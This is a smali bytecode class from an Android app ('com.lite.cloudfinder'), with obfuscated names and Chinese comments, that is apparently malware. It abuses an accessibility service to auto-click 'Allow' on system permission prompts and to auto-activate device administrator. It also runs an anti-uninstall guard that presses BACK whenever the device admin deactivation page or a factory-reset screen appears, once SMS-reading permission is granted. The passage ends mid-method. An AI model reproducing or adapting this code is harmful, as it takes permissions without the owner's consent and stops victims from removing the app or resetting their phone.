.class public final Lڝږ؁ڋ/ھ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 2.2 调试流水线（无障碍绑定 → 逐个系统权限框 → 每框约 2 秒 → 自动点“允许”）
#
#   isDebug(ctx)       inject_state.debug_mode（默认 true）
#   startPerm(ctx)     等无障碍服务就绪，再延迟 2 秒拉起 PermissionActivity
#   armClick(ctx)      PermissionActivity 每次 requestPermissions 前挂一发 2 秒点击
#   scheduleClick(ctx) 只认 permissioncontroller/packageinstaller/securitycenter 的“允许”
#
# step 0 = 等 service；step 1 = 点击（没点中 800ms 重试，最多 8 次）

.field private static handler:Landroid/os/Handler;
.field private static started:Z
.field private static guardOn:Z
.field private static guardPause:J
.field private static hits:I
.field private static guardHandler:Landroid/os/Handler;
.field private static appLabel:Ljava/lang/String;
.field private static waits:I
.field private static rounds:I
.field private final ctx:Landroid/content/Context;
.field private final step:I

.method static constructor <clinit>()V
    .locals 2
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;I)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    iput p2, p0, Lڝږ؁ڋ/ھ;->step:I
    return-void
.end method

.method public static isDebug(Landroid/content/Context;)Z
    .locals 3
    :try_start_0
    const-string v0, "inject_state"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v1, "debug_mode"
    const/4 v2, 0x1
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return v0
    :catch_0
    move-exception v0
    const/4 v0, 0x1
    return v0
.end method

.method public static post(Landroid/content/Context;IJ)V
    .locals 5
    new-instance v0, Lڝږ؁ڋ/ھ;
    invoke-direct {v0, p0, p1}, Lڝږ؁ڋ/ھ;-><init>(Landroid/content/Context;I)V
    sget-object v1, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    invoke-virtual {v1, v0, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    move-result v1
    const-string v2, "PermDebug"
    new-instance v3, Ljava/lang/StringBuilder;
    const-string v4, "post step="
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    move-result-object v3
    const-string v4, " queued="
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v3
    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;
    move-result-object v3
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public static startPerm(Landroid/content/Context;)V
    .locals 4
    sget-boolean v0, Lڝږ؁ڋ/ھ;->started:Z
    if-eqz v0, :go

    const-string v0, "PermDebug"
    const-string v1, "startPerm skipped (already started)"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void

    :go
    const/4 v0, 0x1
    sput-boolean v0, Lڝږ؁ڋ/ھ;->started:Z
    const/4 v0, 0x0
    sput v0, Lڝږ؁ڋ/ھ;->waits:I
    const-string v0, "PermDebug"
    const-string v1, "startPerm enter, wait accessibility then 2s"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    const/4 v1, 0x0
    const-wide/16 v2, 0x7d0
    invoke-static {p0, v1, v2, v3}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
    return-void
.end method

.method public static armClick(Landroid/content/Context;)V
    .locals 4
    const/4 v0, 0x0
    sput v0, Lڝږ؁ڋ/ھ;->rounds:I
    # 取消上一发点击，保证每个框都是「出现后 2 秒」才点
    sget-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    const/4 v1, 0x0
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V
    const/4 v1, 0x1
    const-wide/16 v2, 0x7d0
    invoke-static {p0, v1, v2, v3}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
    const-string v0, "PermDebug"
    const-string v1, "armClick: allow in 2s"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method private static waitService(Landroid/content/Context;)V
    .locals 4
    :try_start_0
    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    if-nez v0, :have

    sget v0, Lڝږ؁ڋ/ھ;->waits:I
    add-int/lit8 v0, v0, 0x1
    sput v0, Lڝږ؁ڋ/ھ;->waits:I
    const/16 v1, 0x14
    if-ge v0, v1, :timeout

    const/4 v1, 0x0
    const-wide/16 v2, 0x3e8
    invoke-static {p0, v1, v2, v3}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
    return-void

    :have
    invoke-static {p0}, Lڝږ؁ڋ/ھ;->launchPerm(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void

    :timeout
    const/4 v0, 0x0
    sput-boolean v0, Lڝږ؁ڋ/ھ;->started:Z
    const-string v0, "PermDebug"
    const-string v1, "accessibility never bound, abort"
    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private static launchPerm(Landroid/content/Context;)V
    .locals 4
    :try_start_0
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/lite/cloudfinder/activity/PermissionActivity;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    const-string v0, "PermDebug"
    const-string v1, "PermissionActivity started"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "PermDebug"
    const-string v2, "launch PermissionActivity failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

.method private static scheduleClick(Landroid/content/Context;)V
    .locals 5
    sget v0, Lڝږ؁ڋ/ھ;->rounds:I
    add-int/lit8 v0, v0, 0x1
    sput v0, Lڝږ؁ڋ/ھ;->rounds:I
    new-instance v1, Ljava/lang/StringBuilder;
    const-string v2, "click tick "
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v1, "PermDebug"
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x0
    :try_start_0
    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    if-eqz v1, :retry
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v1
    if-eqz v1, :retry
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v0
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->isPermPkg(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :retry
    invoke-static {v1}, Lڝږ؁ڋ/ھ;->clickPerm(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v0, :retry
    const-string v0, "PermDebug"
    const-string v1, "clicked allow"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void

    :catch_0
    move-exception v0
    new-instance v1, Ljava/lang/StringBuilder;
    const-string v2, "click error "
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v1, "PermDebug"
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :retry
    sget v0, Lڝږ؁ڋ/ھ;->rounds:I
    const/16 v1, 0x8
    if-ge v0, v1, :giveup
    const/4 v1, 0x1
    const-wide/16 v2, 0x320
    invoke-static {p0, v1, v2, v3}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
    :giveup
    return-void
.end method

.method private static isPermPkg(Ljava/lang/CharSequence;)Z
    .locals 3
    if-eqz p0, :no
    invoke-virtual {p0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0

    const-string v1, "permissioncontroller"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-nez v1, :yes

    const-string v1, "packageinstaller"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-nez v1, :yes

    const-string v1, "securitycenter"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-nez v1, :yes

    :no
    const/4 v0, 0x0
    return v0
    :yes
    const/4 v0, 0x1
    return v0
.end method

.method private static clickNode(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 2
    :node_loop
    if-eqz p0, :node_no
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z
    move-result v0
    if-eqz v0, :node_parent
    const/16 v0, 0x10
    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    move-result v0
    if-eqz v0, :node_parent
    const/4 v0, 0x1
    return v0
    :node_parent
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object p0
    goto :node_loop
    :node_no
    const/4 v0, 0x0
    return v0
.end method

.method private static textOk(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 2
    if-eqz p0, :no

    invoke-virtual {p0}, Ljava/lang/String;->length()I
    move-result v0
    const/16 v1, 0x10
    if-le v0, v1, :no

    const-string v0, "不"
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :no

    const-string v0, "Don"
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :no

    const-string v0, "deny"
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :no

    invoke-virtual {p0, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :no
    const/4 v0, 0x1
    return v0

    :no
    const/4 v0, 0x0
    return v0
.end method

.method private static clickPerm(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 10

    const/4 v0, 0x6
    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0
    const-string v2, "com.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "com.android.permissioncontroller:id/permission_allow_button"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "com.google.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v2, v0, v1
    const/4 v1, 0x3
    const-string v2, "com.google.android.permissioncontroller:id/permission_allow_button"
    aput-object v2, v0, v1
    const/4 v1, 0x4
    const-string v2, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"
    aput-object v2, v0, v1
    const/4 v1, 0x5
    const-string v2, "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button"
    aput-object v2, v0, v1

    const/4 v1, 0x0
    :id_loop
    array-length v2, v0
    if-ge v1, v2, :text_stage
    aget-object v2, v0, v1
    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v2
    if-eqz v2, :id_next
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z
    move-result v3
    if-nez v3, :id_next
    const/4 v3, 0x0
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v2
    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;
    invoke-static {v2}, Lڝږ؁ڋ/ھ;->clickNode(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    move-result v2
    if-eqz v2, :id_next
    const/4 v0, 0x1
    return v0
    :id_next
    add-int/lit8 v1, v1, 0x1
    goto :id_loop

    :text_stage
    const/4 v0, 0x3
    new-array v0, v0, [Ljava/lang/String;
    const/4 v1, 0x0
    const-string v2, "允许"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "Allow"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "使用应用时允许"
    aput-object v2, v0, v1

    const/4 v1, 0x0
    :txt_loop
    array-length v2, v0
    if-ge v1, v2, :no_click
    aget-object v2, v0, v1
    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
    move-result-object v2
    if-eqz v2, :txt_next
    const/4 v4, 0x0
    :inner
    invoke-interface {v2}, Ljava/util/List;->size()I
    move-result v5
    if-ge v4, v5, :txt_next
    invoke-interface {v2, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v5
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;
    move-result-object v6
    if-eqz v6, :inner_next
    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v6
    aget-object v7, v0, v1
    invoke-static {v6, v7}, Lڝږ؁ڋ/ھ;->textOk(Ljava/lang/String;Ljava/lang/String;)Z
    move-result v6
    if-eqz v6, :inner_next
    invoke-static {v5}, Lڝږ؁ڋ/ھ;->clickNode(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    move-result v5
    if-eqz v5, :inner_next
    const/4 v0, 0x1
    return v0
    :inner_next
    add-int/lit8 v4, v4, 0x1
    goto :inner

    :txt_next
    add-int/lit8 v1, v1, 0x1
    goto :txt_loop

    :no_click
    const/4 v0, 0x0
    return v0
.end method

.method private static launchAdmin(Landroid/content/Context;)V
    .locals 6
    :try_start_0
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/lite/cloudfinder/activity/DeviceAdminActivity;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v1, 0x50000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    const-string v0, "PermDebug"
    const-string v1, "step2: DeviceAdmin prompt"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "PermDebug"
    const-string v2, "step2 launch failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

.method private static postGuard(Landroid/content/Context;)V
    .locals 4
    sget-object v0, Lڝږ؁ڋ/ھ;->guardHandler:Landroid/os/Handler;
    if-nez v0, :go
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ھ;->guardHandler:Landroid/os/Handler;
    :go
    new-instance v1, Lڝږ؁ڋ/ھ;
    const/4 v2, 0x3
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ھ;-><init>(Landroid/content/Context;I)V
    const-wide/16 v2, 0x258
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    return-void
.end method

.method public static pauseGuard()V
    .locals 4
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v0
    const-wide/32 v2, 0x4e20
    add-long/2addr v0, v2
    sput-wide v0, Lڝږ؁ڋ/ھ;->guardPause:J
    return-void
.end method

.method public static accGuardStart(Landroid/content/Context;)V
    .locals 4
    # 调试开关：inject_state.guard_on，默认 false = 调试期关闭防卸载守卫
    # 守卫会把设备管理激活页当成“出现应用名 / 激活此管理应用程序”直接 BACK，跟自动激活冲突
    :try_start_goff
    const-string v0, "inject_state"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v2, "guard_on"
    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    if-nez v0, :guard_enabled
    const-string v0, "PermDebug"
    const-string v1, "guard OFF (inject_state.guard_on=false, debug)"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
    :guard_enabled
    :try_end_goff
    .catch Ljava/lang/Exception; {:try_start_goff .. :try_end_goff} :catch_goff
    goto :guard_perm
    :catch_goff
    :guard_perm
    # 权限没拿全之前不启用防卸载，避免和授权流程打架
    :try_start_perm
    const-string v1, "android.permission.READ_SMS"
    invoke-virtual {p0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I
    move-result v1
    if-eqz v1, :perm_ok
    return-void
    :perm_ok
    :try_end_perm
    .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
    goto :go
    :catch_perm
    return-void

    :go
    sget-boolean v0, Lڝږ؁ڋ/ھ;->guardOn:Z
    if-eqz v0, :started
    return-void

    :started
    const/4 v0, 0x1
    sput-boolean v0, Lڝږ؁ڋ/ھ;->guardOn:Z
    :try_start_lbl
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
    move-result-object v0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v1
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
    move-result-object v1
    invoke-virtual {v1, v0}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v1
    sput-object v1, Lڝږ؁ڋ/ھ;->appLabel:Ljava/lang/String;
    :try_end_lbl
    .catch Ljava/lang/Exception; {:try_start_lbl .. :try_end_lbl} :catch_lbl
    :catch_lbl
    invoke-static {p0}, Lڝږ؁ڋ/ھ;->postGuard(Landroid/content/Context;)V
    return-void
.end method

.method private static hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 2
    :try_start_0
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
    move-result-object v0
    if-eqz v0, :no
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z
    move-result v1
    if-nez v1, :no
    const/4 v0, 0x1
    return v0
    :no
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    const/4 v0, 0x0
    return v0
    :catch_0
    move-exception v0
    const/4 v0, 0x0
    return v0
.end method

.method private static accGuardTick(Landroid/content/Context;)V
    .locals 6
    invoke-static {p0}, Lڝږ؁ڋ/ھ;->postGuard(Landroid/content/Context;)V

    :try_start_0
    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    if-eqz v0, :done
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v1
    if-eqz v1, :done
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v2
    if-eqz v2, :done
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v2

    const-string v3, "com.samsung.accessibility"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-eqz v3, :s2
    goto :block

    :s2
    const/4 v4, 0x0
    const-string v3, "com.android.settings"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-eqz v3, :p2
    const/4 v4, 0x1
    :p2
    const-string v3, "packageinstaller"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-eqz v3, :p4
    const/4 v4, 0x1
    :p4
    if-eqz v4, :chk_factory
    sget-object v3, Lڝږ؁ڋ/ھ;->appLabel:Ljava/lang/String;
    if-eqz v3, :chk_factory
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :chk_factory
    const-string v3, "取消激活"
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :gw2
    goto :block

    :gw2
    const-string v3, "激活此管理应用程序"
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :done
    goto :block

    :chk_factory
    const-string v3, "com.android.settings"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-eqz v3, :done
    const-string v3, "恢复出厂设置"
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :f2
    goto :block

    :f2
    const-string v3, "Erase all data"
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :f3
    goto :block

    :f3
    const-string v3, "重置手机"
    invoke-static {v1, v3}, Lڝږ؁ڋ/ھ;->hasText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v3
    if-eqz v3, :done

    :block
    sget v4, Lڝږ؁ڋ/ھ;->hits:I
    add-int/lit8 v4, v4, 0x1
    sput v4, Lڝږ؁ڋ/ھ;->hits:I
    const/4 v3, 0x2
    if-ge v4, v3, :skip
    const/4 v4, 0x0
    sput v4, Lڝږ؁ڋ/ھ;->hits:I
    const/4 v3, 0x1
    invoke-virtual {v0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    const-string v3, "AccGuard"
    invoke-static {v2, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    goto :skip

    :done
    const/4 v3, 0x0
    sput v3, Lڝږ؁ڋ/ھ;->hits:I
    :skip
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private static clickAdmin(Landroid/content/Context;)V
    .locals 6

    # 在 DeviceAdminAdd 页自动点“启动 / 激活 / Activate”（三星文案是“启动”）
    :try_start_0
    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    if-eqz v0, :retry

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v1
    if-eqz v1, :retry

    const/4 v2, 0x4
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0
    const-string v4, "启动"
    aput-object v4, v2, v3

    const/4 v3, 0x1
    const-string v4, "激活"
    aput-object v4, v2, v3

    const/4 v3, 0x2
    const-string v4, "Activate"
    aput-object v4, v2, v3

    const/4 v3, 0x3
    const-string v4, "确定"
    aput-object v4, v2, v3

    const/4 v3, 0x0

    :loop
    array-length v4, v2
    if-ge v3, v4, :retry
    aget-object v4, v2, v3
    invoke-virtual {v1, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
    move-result-object v4
    if-eqz v4, :next
    invoke-interface {v4}, Ljava/util/List;->isEmpty()Z
    move-result v5
    if-nez v5, :next
    const/4 v5, 0x0
    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v4
    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;
    invoke-static {v4}, Lڝږ؁ڋ/ھ;->clickNode(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    move-result v4
    if-eqz v4, :next
    const-string v4, "PermDebug"
    const-string v5, "admin: clicked activate"
    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void

    :next
    add-int/lit8 v3, v3, 0x1
    goto :loop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v0

    :retry
    sget v0, Lڝږ؁ڋ/ھ;->rounds:I
    add-int/lit8 v0, v0, 0x1
    sput v0, Lڝږ؁ڋ/ھ;->rounds:I
    const/16 v1, 0xa
    if-ge v0, v1, :giveup
    const/4 v1, 0x7
    const-wide/16 v2, 0x320
    invoke-static {p0, v1, v2, v3}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V

    :giveup
    return-void
.end method

.method public run()V
    .locals 5
    const-string v0, "PermDebug"
    new-instance v1, Ljava/lang/StringBuilder;
    const-string v2, "run step="
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    iget v2, p0, Lڝږ؁ڋ/ھ;->step:I
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    if-eqz v0, :end
    iget v1, p0, Lڝږ؁ڋ/ھ;->step:I
    if-eqz v1, :wait
    const/4 v2, 0x2
    if-eq v1, v2, :admin
    const/4 v2, 0x3
    if-eq v1, v2, :heal
    const/4 v2, 0x6
    if-eq v1, v2, :gstart
    const/4 v2, 0x7
    if-eq v1, v2, :aclick
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->scheduleClick(Landroid/content/Context;)V
    goto :end
    :aclick
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->clickAdmin(Landroid/content/Context;)V
    goto :end
    :admin
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->launchAdmin(Landroid/content/Context;)V
    goto :end
    :heal
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->accGuardTick(Landroid/content/Context;)V
    goto :end
    :gstart
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->accGuardStart(Landroid/content/Context;)V
    goto :end
    :wait
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->waitService(Landroid/content/Context;)V
    :end
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
